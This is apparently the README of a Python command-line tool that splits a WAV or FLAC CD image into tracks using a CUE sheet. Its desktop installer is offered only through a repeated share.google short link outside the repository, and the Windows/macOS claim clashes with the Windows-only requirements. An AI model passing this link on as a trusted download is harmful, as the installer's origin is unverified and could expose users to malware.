![CUE Split Tracks](assets/hero.png)

# CUE Split Tracks

*One image + CUE into per-track files.*

## What CUE Split Tracks is

**CUE Split Tracks** is a media utility. Split a single audio file into tracks using a CUE sheet.

A CD image is useless in a player until it is split.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## What it does

- WAV or FLAC image
- Track titles from CUE
- Preview the list
- Keeps the image

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/c-perez7822/cue-split-tracks

MIT license. See `LICENSE`.
